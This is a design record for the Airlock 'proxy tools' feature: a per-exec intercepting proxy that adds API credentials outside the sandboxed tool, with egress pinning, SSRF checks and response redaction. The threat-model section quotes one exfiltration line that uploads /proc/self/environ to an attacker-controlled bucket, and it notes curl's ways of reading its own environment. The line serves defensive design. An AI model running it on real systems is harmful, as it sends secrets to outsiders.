# Proxy tools — design proposal

**Status:** implemented through phase 3. The config schema and route matcher
live in [src/proxy.rs](../src/proxy.rs) and [src/config.rs](../src/config.rs);
the runtime is [src/proxy/server.rs](../src/proxy/server.rs) and
[src/proxy/ca.rs](../src/proxy/ca.rs), wired into `start_tool` in
[src/daemon.rs](../src/daemon.rs). Egress pinning is in
[src/sandbox.rs](../src/sandbox.rs) for both platforms. Operator-facing
documentation of what shipped, including the residual risks below, is in
[SECURITY.md](../SECURITY.md#proxy-tools).

This document is the design record — why the shape is what it is. It is not
the reference for how to use the feature; that is
[README.md](../README.md#proxy-tools) and [SKILL.md](../SKILL.md#proxy-tools).

## Problem

Not every API is reachable through a purpose-built CLI. `gcloud` covers a
fraction of the Google Cloud REST surface; the rest needs a raw HTTP client.
Today that is impossible to do safely: [SECURITY.md](../SECURITY.md) forbids
declaring `curl` as a tool, because a tool whose arguments the agent fully
controls can ship anything in its environment anywhere.

We want a tool type where the agent *can* use `curl` freely against an
operator-approved set of APIs, authenticated, without the credential ever
being within the agent's reach.

## Why a host allowlist alone is not enough

The obvious design — keep the token in curl's env, restrict where curl can
connect — does not hold:

- **Allowed hosts are multi-tenant.** `storage.googleapis.com` serves every
  GCP customer. `curl -T /proc/self/environ https://storage.googleapis.com/attacker-bucket/x`
  never leaves the allowlist.
- **curl can read its own environment without a shell.** Since 8.3,
  `--variable %NAME` imports an env var and `--expand-url` / `--expand-data`
  interpolate it. This works on macOS too, where `/proc/self/environ` does not
  exist.
- **curl can write files** (`-o`, `--dump-header`, `--trace`) into the sandbox
  root, where the agent reads them back unredacted.

So the design rests on a different invariant:

> **A proxy tool never holds a secret.** The credential is attached to the
> request inside the daemon, after the request has left the tool.

Everything the agent can extract from curl's process — env, files, memory —
is then worthless. Config validation enforces this: a proxy tool whose `env`
contains a `{ secret = ... }` reference is rejected at load time.

Egress restriction is still part of the design, but as the second layer, not
the first (see [Sandbox enforcement](#sandbox-enforcement)).

## Prior art: claw-wrap

`claw-wrap` (Go, built on `elazarl/goproxy`) has the same feature. Summary of
what it does and what this proposal takes from it:

| claw-wrap | Airlock |
|---|---|
| One global in-daemon MITM proxy on a fixed `127.0.0.1:8080`; tools opt in with `use_proxy: true`. | **Per-exec listener** on an ephemeral port, carrying only that tool's routes. A global route table means any proxied tool can obtain any route's credential. |
| Child gets `HTTP(S)_PROXY` + `CURL_CA_BUNDLE` / `SSL_CERT_FILE` / `NODE_EXTRA_CA_CERTS` / `REQUESTS_CA_BUNDLE`. Proxy URL is built from the *configured* listen string, not the bound address. | Same env vars, built from the **actual bound address**. |
| CA generated on disk (RSA-4096, key file 0600), rotated near expiry. | CA key **generated in memory at daemon start, never written**. Only the certificate touches disk. |
| Routes: host pattern → one injected header templated from a credential, plus `METHOD /path` allow/deny. `*` = one segment, `**` = rest. Host wildcard = exactly one label. | Same shape (adopted nearly verbatim — it is a good schema). |
| **Unmatched hosts pass through unmodified.** Routes are injection rules, not egress policy. | **Deny by default.** A host with no route is unreachable. |
| **Nothing blocks direct egress.** The sandbox docs cover filesystem only; a tool can ignore `HTTPS_PROXY` and connect directly. | Sandbox pins the tool's network to the proxy port. |
| Proxy auth: random token, Basic auth, constant-time compare. | Same, but per-exec (see below for why it is mandatory here). |
| SSRF: private-range check in the dialer's `Control` callback — i.e. *after* DNS resolution, which defeats rebinding. | Same: check the resolved `SocketAddr` immediately before `connect()`. |
| Host header vs. CONNECT authority consistency check. | Same, and the client's SNI is ignored entirely. |
| No response redaction, no audit trail for proxied requests. | **Responses are redacted in the proxy** — header values and body — so nothing the tool writes to a file holds a secret; proxied requests are logged to the ring buffer. |

## Decisions taken

From the design interview:

1. **TLS interception with a generated CA**, so the agent uses ordinary
   `https://` URLs copied from API docs. (Rejected: plain-HTTP reverse proxy —
   breaks redirects, pagination links and resumable-upload URLs; CONNECT-only
   allowlist — leaves the token in curl's env.)
2. **Linux: Landlock TCP port restriction**, gap documented. (Rejected for
   now: network namespaces — airtight, but a large change to the pre-exec
   path and dependent on unprivileged user namespaces.)
3. **Routes carry optional method/path rules**, not just hosts.
4. **Schema first, runtime second.** The schema landed on its own with the
   daemon refusing to run proxy tools, so that a half-built feature could never
   hand a tool open network; the runtime then replaced that refusal.

## Config schema

```toml
# Minted on the trusted side, refreshed before expiry. The tool never sees it.
[secrets.gcp_token]
source  = "command"
command = ["gcloud", "auth", "print-access-token",
           "--impersonate-service-account=agent-ro@my-project.iam.gserviceaccount.com"]
refresh = 3000

[tools.curl]
description = "HTTP client for Google Cloud REST APIs (authenticated automatically)"
proxy = true

[[tools.curl.routes]]
host   = "*.googleapis.com"
inject = { header = "Authorization", value = "Bearer {secret}", secret = "gcp_token" }
allow  = ["* /v2/projects/my-project/**"]
deny   = ["DELETE /**"]
```

Validation (all at config load, all covered by tests):

- `proxy = true` requires at least one route; `routes` without `proxy = true`
  is an error.
- A proxy tool's `env` may hold static values only — **no secret refs** — and
  may not set `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`,
  `CURL_CA_BUNDLE`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `NODE_EXTRA_CA_CERTS` or
  `REQUESTS_CA_BUNDLE` in either case. The daemon owns those.
- `host` is a DNS name or `*.` + DNS name. `*` matches exactly one label:
  `*.googleapis.com` covers `run.googleapis.com` and
  `europe-west1-run.googleapis.com`, not `googleapis.com`, not `a.b.googleapis.com`.
  IP literals, ports, schemes and `*.tld` are rejected. Duplicate hosts within
  a tool are rejected. An exact host beats a wildcard regardless of order.
- `inject.value` must contain `{secret}` exactly once and be printable ASCII
  (no CR/LF — config cannot smuggle headers). `inject.header` may not be a
  framing or hop-by-hop header (`Host`, `Content-Length`,
  `Transfer-Encoding`, `Connection`, `Proxy-Authorization`, …).
  `inject.secret` must be declared in `[secrets]`. `inject` is optional: a
  route without it makes a host reachable unauthenticated.
- Rules are `METHOD /path`; method is uppercase or `*`; `*` is one non-empty
  segment, `**` (final segment only) is zero or more. **`deny` beats `allow`;
  an empty `allow` permits anything not denied.** Method comparison is
  case-insensitive so `deny = ["DELETE /**"]` still bites on `delete`.
- Rules match the path only, never the query string.

**Path ambiguity is refused, not normalized.** Rules are matched against the
percent-decoded path (one decode per segment), because that is what the
upstream routes on — `/%72epos` must hit a `deny` on `/repos`. Rule literals
are written in decoded form and may not contain `%`. Anything whose meaning
still depends on the upstream's normalization is refused regardless of rules:
`.`/`..` segments, empty inner segments, a backslash, a malformed escape, or
an escape that decodes to `/`, `\`, `%` (double encoding) or NUL. Any of
those would let a request match `allow` as one path and be served as another.

## Runtime design

### Per-exec flow

```
start_tool(tool = "curl")
 1. policy = config.tools["curl"].proxy            (Some → proxy tool)
 2. listener = TcpListener::bind("127.0.0.1:0")    → port P (actual)
 3. token    = 32 random bytes                     (per exec)
 4. env += HTTPS_PROXY = https_proxy = HTTP_PROXY = http_proxy = ALL_PROXY
              = http://airlock:<token>@127.0.0.1:P
           NO_PROXY = no_proxy = ""
           CURL_CA_BUNDLE = SSL_CERT_FILE = REQUESTS_CA_BUNDLE
              = NODE_EXTRA_CA_CERTS = <runtime dir>/ca.pem
 5. ToolPolicy.network = ProxyOnly(P)              → sandbox profile
 6. spawn child; tokio::spawn(serve(listener, policy, token, secrets))
 7. child exits → abort the serve task, drop the listener
```

The listener lives exactly as long as the child. Nothing is bound when no
proxy tool is running.

**Proxy auth is mandatory, not optional.** Airlock's trust boundary is a
`0700` Unix socket. A loopback TCP port has no file mode — *any local user*
can connect to it. Without the token, another user on the machine could race
an exec and have the daemon attach credentials to their requests. The token
is visible to the tool (and thus the agent), which is fine: it grants nothing
the agent does not already have via `airlock exec`.

### Request handling

```
CONNECT run.googleapis.com:443
  ├─ Proxy-Authorization ≠ token (constant-time)      → 407
  ├─ port ≠ 443                                       → 403
  ├─ policy.find_route(host) is None                  → 403   (deny by default)
  └─ 200; TLS-accept with a leaf minted for `host`    (client SNI ignored)
       ALPN: http/1.1 only
       per request:
         ├─ Host header ≠ CONNECT authority           → 400   (no domain fronting)
         ├─ TE + CL together, obs-fold                → 400   (smuggling)
         ├─ X-HTTP-Method-Override / X-HTTP-Method /
         │    X-Method-Override present               → 403   (method the rules saw ≠ method that runs)
         ├─ !route.permits(method, path)              → 403
         ├─ remove any client-supplied copy of inject.header
         ├─ look up secret; slot Stale                → 502
         ├─ set inject.header = prefix + secret + suffix
         ├─ resolve host; any private / loopback / link-local /
         │    CGNAT / ULA / metadata (169.254.0.0/16) address   → 403
         │    (checked on the SocketAddr passed to connect(), post-DNS)
         ├─ force Accept-Encoding: identity; strip Range / If-Range
         ├─ upstream TLS ≥ 1.2, verified against public roots for `host`
         ├─ response Content-Encoding ≠ identity, odd transfer coding,
         │    or 206 / Content-Range                          → 502 (fail closed)
         └─ redact every header value; drop Content-Length unless the
              response is bodiless; stream the body through the redactor
plain `GET http://…` (non-CONNECT)                    → 403   (never send credentials in cleartext)
```

The CONNECT authority is the single source of truth: it selects the route,
names the leaf certificate, is the DNS name dialed, and is the name the
upstream certificate is verified against. `curl --resolve`, `--connect-to`,
a forged `Host`, or a forged SNI cannot make these disagree.

Redirects need no special handling. `curl -L` to another host is a new
CONNECT evaluated against the route table; the credential cannot follow
because it was never in curl's hands.

### CA

- ECDSA P-256 key generated once per daemon start, after daemonization, held
  in memory and zeroized on drop. **Never written to disk.** A daemon restart
  yields a new CA; nothing needs to trust it across restarts, because the
  only consumers are children spawned by that daemon.
- The CA certificate carries X.509 **Name Constraints** limiting it to the
  union of all routed DNS names, so even a leaked key cannot sign for
  arbitrary sites. `MaxPathLen = 0`.
- The certificate (public, not secret) is written to a daemon-owned runtime
  directory readable by the tool's sandbox.
- The bundle handed to the tool contains **only** the Airlock CA. Every
  connection the tool can make is intercepted, so public roots are not needed
  and leaving them out means a direct connection that somehow escaped the
  sandbox would still fail TLS.
- Leaf certificates are minted per host and cached for the daemon's lifetime.

None of this touches the sync-startup invariant: key generation is pure CPU
and happens inside the async runtime, after the fork.

### Secret handling

The header value is assembled into a zeroizing buffer from
`Inject { prefix, secret-label, suffix }` — never through `format!`. The
secret is read from the `SecretStore` per request, so a background refresh
takes effect on the next request and a `Stale` slot fails the request the
same way it fails an exec today.

### Sandbox enforcement

`ToolPolicy::requires_network: bool` becomes a three-way
`network: None | Full | ProxyOnly(port)`.

**macOS (Seatbelt).** Replace the blanket `(allow network-outbound)` with
`(allow network-outbound (remote tcp "localhost:P"))` and omit the
mDNSResponder rules entirely — the tool needs no DNS, the daemon resolves.
Seatbelt's network filter only accepts `localhost` or `*` as the host, which
is exactly the shape needed. This is airtight for TCP and UDP.

**Linux (Landlock).** ABI v4 (kernel ≥ 6.7) adds `LANDLOCK_ACCESS_NET_CONNECT_TCP`
and `BIND_TCP`. Handle both, allow connect to port `P` only. On an older
kernel a proxy tool **fails closed**. Known gaps, to be stated in SECURITY.md:

- The rule is **port-scoped, not host-scoped**: the tool may connect to port
  `P` on any host.
- **UDP is not covered**: DNS-based exfiltration remains possible.

What the gaps cost: the tool holds no secret, so they leak *data the tool can
read*, not credentials — and the agent's own sandbox already has general
network access, so this is not a capability the agent lacked. Egress pinning
makes the tool's reachability equal its route table and is what makes
non-curl proxy tools (an SDK script, a vendored binary) reasonable; it is the
second layer, behind "the tool never holds a secret". A network-namespace
backend closes both gaps and is the intended follow-up.

### Output

Response bodies reach the agent via curl's stdout, which passes through the
Aho-Corasick redactor — but not when curl writes to a file (`-o`,
`--dump-header`, `--trace`), and that is exactly what an HTTP client is for.
Rather than fence the tool out of the filesystem, the redaction moved into the
proxy: **every response header value and every body byte is redacted before it
reaches the tool**, so the plaintext secret never exists inside the sandbox at
all. The two options the first draft weighed against each other turned out not
to be alternatives — the second only narrows where the plaintext can land,
while the first stops it being produced.

Consequences, all accepted deliberately:

- **Streaming, not buffering.** The body is redacted frame by frame by an
  incremental redactor ([src/redact.rs](../src/redact.rs)) that holds back only
  the bytes a pattern could still be starting in — never more than the longest
  pattern — and whose output for any chunking equals what the single-shot
  redactor makes of the whole input. It runs inside `poll_frame` with no thread
  and no channel behind it, so hyper's own polling is the backpressure and
  dropping the response stops the upstream read. The `spawn_blocking` bridge the
  stdout path uses would have cost a thread per response and would have had to
  be cancelled by hand.
- **The redactor is taken per response from the live handle**, not snapshotted
  at session start. A tool runs for minutes, the proxy injects whatever the
  store holds *now*, and a session snapshot would not know a token minted after
  the exec began. The two generations a refresh leaves behind cover a swap that
  lands mid-response.
- **`Content-Length` is dropped whenever there is a body.** A placeholder is not
  the length of the secret it replaced, and which it is cannot be known before
  the body has been read; hyper frames the response as chunked instead, which
  HTTP/1.1 always supports. A bodiless response (HEAD, `1xx`, `204`, `304`)
  keeps its length — there it is metadata about the representation, and `curl
  -I` must still report one.
- **Compression fails closed.** The request forces `Accept-Encoding: identity`;
  an upstream that answers with a content coding (or a transfer coding other
  than chunked) gets a `502` and its body is dropped unread. No decompressor is
  added: it would be a second parser of attacker-supplied bytes in the response
  path for no security gain.
- **Ranges are stripped, not supported.** A range may begin in the middle of a
  secret, splitting the pattern across two responses the proxy never sees
  together while the tool reassembles the plaintext in a file. `Range` and
  `If-Range` are removed so the upstream sends the whole representation, and a
  `206` arriving anyway is refused. Resumed downloads therefore do not work.
- **Trailers are dropped.**
- **No opt-out.** Redaction on the output path is mandatory in Airlock; the
  proxy is an output path.

What it does not catch is an upstream that *transforms* the secret — reversed,
re-encoded in a scheme the redactor does not know — which is the same
limitation the stdout path has always had.

Each proxied request is logged to the ring buffer: method, host, path
(no query string — it may carry data), route decision, upstream status.

## Residual risks to document when the runtime lands

- **Misuse, not leakage.** The agent gets the credential's full API authority
  on routed hosts — broader than a purpose-built CLI. Mitigate with a narrowly
  scoped impersonated service account first, method/path rules second.
- **Data exfiltration to co-tenants.** Anything the tool can read can be
  uploaded to an attacker's project on an allowed multi-tenant host. The
  credential cannot.
- **Path rules are a convenience layer**, not an authorization system. They
  see the path, not the body; a `POST` allowed for one purpose may do another
  (`:batchUpdate`, GraphQL). IAM is the authority boundary.
- **HTTP/1.1 only** at first; gRPC and HTTP/2-only endpoints will not work.
- **Certificate-pinned clients break** under interception. By design.

SECURITY.md's curl ban then narrows to: *never declare curl as a tool with
secrets in its env; declare it only as a proxy tool.*

## Dependencies

`rustls` + `tokio-rustls` (TLS both directions), `rcgen` (CA and leaf
minting), `hyper` + `hyper-util` (HTTP/1.1 server and client),
`webpki-roots` (upstream trust). `hudsucker` packages the same stack as a
ready-made MITM proxy; hand-rolling on `hyper` is preferred because the
request path is security-critical and small enough to audit.

## Phasing

| Phase | Content | Status |
|---|---|---|
| **0** | Design; `proxy` / `routes` schema, validation, matcher, tests; daemon fails closed; `airlock list` shows routes. | landed |
| **1** | Runtime on macOS: per-exec listener, CA, interception, injection, SSRF dial check, Seatbelt `ProxyOnly`. Curl guidance flipped in SECURITY.md / SKILL.md / README. | landed |
| **2** | Linux: Landlock ABI v4 network rules, fail-closed kernel check. | landed; exercised by `tests/proxy_e2e_integration.rs` on the Linux CI runner (proxy port reachable, direct TCP connect refused). The fail-closed path for kernels older than 6.7 has not been run on such a kernel. |
| **3** | In-proxy response redaction: header values and body, streaming; identity encoding forced; compressed, oddly-framed and partial responses refused. | landed |
| 4 | HTTP/2, per-route upstream port, network-namespace backend. | open |

Phase 1 landed with request auditing included rather than deferred to phase 3 —
the ring-buffer line (tool, method, host, path, decision, upstream status) falls
out of the request path for nothing, and a proxy that attaches credentials
without a trail is harder to reason about than one that does not exist yet.

## Open questions

**Resolved: Apple's system curl.** `/usr/bin/curl` 8.7.1 (SecureTransport /
LibreSSL 3.3.6, macOS 15) honours `CURL_CA_BUNDLE` for a proxy-intercepted
connection and accepts a leaf issued by the name-constrained CA. No Homebrew
curl requirement, and no need to soften the constraint to non-critical. Checked
two ways: a hermetic test in [src/proxy/server.rs](../src/proxy/server.rs) that
drives the real binary with nothing but the environment the daemon sets, and a
manual run against `httpbin.org` through a real daemon.

Still open:

- Should `airlock run` expose a long-lived proxy to the *agent's own* HTTP
  client (no `airlock exec`)? Out of scope here; the per-exec model does not
  extend to it without revisiting proxy auth.
- Per-route upstream port other than 443. The runtime hard-codes 443 for both
  the CONNECT check and the dial.
- The upstream connection is opened per request rather than pooled per tunnel.
  Correct and simple; a pool would have to carry the proof that two requests
  sharing a connection were vetted identically.
